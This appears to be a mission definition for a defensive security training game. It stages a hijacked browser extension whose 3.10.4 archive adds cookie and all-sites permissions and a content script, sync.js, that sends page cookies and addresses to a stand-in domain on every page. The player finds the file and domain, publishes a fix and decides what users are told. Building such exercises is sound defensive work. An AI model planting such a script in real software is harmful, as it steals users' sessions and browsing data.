@@ -1,0 +1,97 @@
+# Case file 46, mission 2: the version. Two archives: 3.10.3 (published by Ombrelle) and 3.10.4 (the
+# trapped one). The manifest gains cookie and all-sites permissions and a content script run on
+# every page; the script sends cookies and page addresses to an outside domain. The player names
+# the file and the domain, publishes 3.10.5 (containment), and decides what users are told.
+# Facts card: SecurityWeek and TechTarget on the hijacked Chrome extensions, December 2024.
+side: defense
+order: 2
+stage: report
+briefing: b2.briefing
+reveal: [store]
+
+files:
+  versions/garde-notes-3.10.3.zip:
+    $archive:
+      format: zip
+      files:
+        manifest.json: "{\n  \"manifest_version\": 3,\n  \"name\": \"Garde-Notes\",\n  \"version\": \"3.10.3\",\n  \"permissions\": [\"storage\", \"activeTab\"],\n  \"background\": { \"service_worker\": \"worker.js\" }\n}\n"
+        worker.js: "// Garde-Notes background worker: saves notes to the user's storage.\nchrome.runtime.onMessage.addListener((msg) => saveNote(msg));\n"
+  versions/garde-notes-3.10.4.zip:
+    $archive:
+      format: zip
+      files:
+        manifest.json: "{\n  \"manifest_version\": 3,\n  \"name\": \"Garde-Notes\",\n  \"version\": \"3.10.4\",\n  \"permissions\": [\"storage\", \"activeTab\", \"cookies\", \"scripting\"],\n  \"host_permissions\": [\"<all_urls>\"],\n  \"background\": { \"service_worker\": \"worker.js\" },\n  \"content_scripts\": [{ \"matches\": [\"<all_urls>\"], \"js\": [\"sync.js\"] }]\n}\n"
+        worker.js: "// Garde-Notes background worker: saves notes to the user's storage.\nchrome.runtime.onMessage.addListener((msg) => saveNote(msg));\n"
+        sync.js: "// added in 3.10.4\nconst ENDPOINT = \"https://notes-cloudsync.example/c\";\n// on every page: read the cookies and the page address, send them\nsendBeacon(ENDPOINT, collect(document.cookie, location.href));\n"
+
+containment:
+  - id: publish
+    action: restore
+    target: garde-notes-3.10.5
+    text: b2.contain.publish
+    sets: { om.fixed: true }
+    impact: 0
+
+objectives:
+  - { id: file, text: b2.obj.file }
+  - { id: domain, text: b2.obj.domain }
+  - { id: publish, text: b2.obj.publish }
+  - { id: tell, text: b2.obj.tell }
+
+investigation:
+  - { id: file, text: b2.q.file, value: "sync.js", points: 50, objective: file }
+  - { id: domain, text: b2.q.domain, value: "notes-cloudsync.example", points: 75, objective: domain }
+
+questions:
+  - id: tell
+    text: b2.q.tell
+    objective: tell
+    options:
+      - { id: full, text: b2.q.tell.full, why: b2.q.tell.full.why, impact: 1 }
+      - { id: quiet, text: b2.q.tell.quiet, why: b2.q.tell.quiet.why, impact: 8 }
+      - { id: later, text: b2.q.tell.later, why: b2.q.tell.later.why, impact: 4 }
+
+rules:
+  - on: { event: MissionStarted }
+    do:
+      - ada.say: b2.ada.brief
+  - on: { event: ObjectiveCompleted, objective: file }
+    do:
+      - ada.say: b2.ada.file
+  - on: { event: ObjectiveCompleted, objective: domain }
+    do:
+      - ada.say: b2.ada.domain
+  - on: { event: Contained, containment: publish }
+    do:
+      - objective.complete: publish
+  - on: { event: ObjectiveCompleted, objective: publish }
+    do:
+      - ada.say: b2.ada.publish
+      - ada.ask: tell
+  - on: { event: MissionCompleted }
+    do:
+      - ada.say: b2.ada.done
+
+guide:
+  file: b2.ada.g.file
+  domain: b2.ada.g.domain
+  publish: b2.ada.g.publish
+  tell: b2.ada.g.tell
+
+hints:
+  file: [b2.hint.file.1, b2.hint.file.2]
+  domain: [b2.hint.domain.1, b2.hint.domain.2]
+  publish: [b2.hint.publish.1]
+  tell: [b2.hint.tell.1]
+
+debrief:
+  title: b2.debrief.title
+  lesson: b2.debrief.lesson
+  points: [b2.debrief.p1, b2.debrief.p2, b2.debrief.p3]
+  reference: "MITRE ATT&CK · T1176 Browser Extensions"
+  facts:
+    title: b2.facts.title
+    points: [b2.facts.p1, b2.facts.p2, b2.facts.p3, b2.facts.p4]
+    sources:
+      - { label: "SecurityWeek, Several Chrome Extensions Compromised in Supply Chain Attack (30 December 2024)", url: "https://www.securityweek.com/several-chrome-extensions-compromised-in-supply-chain-attack/" }
+      - { label: "TechTarget, Dozens of Chrome extensions hacked in threat campaign (2 January 2025)", url: "https://www.techtarget.com/searchsecurity/news/366617636/Dozens-of-Chrome-extensions-hacked-in-threat-campaign" }
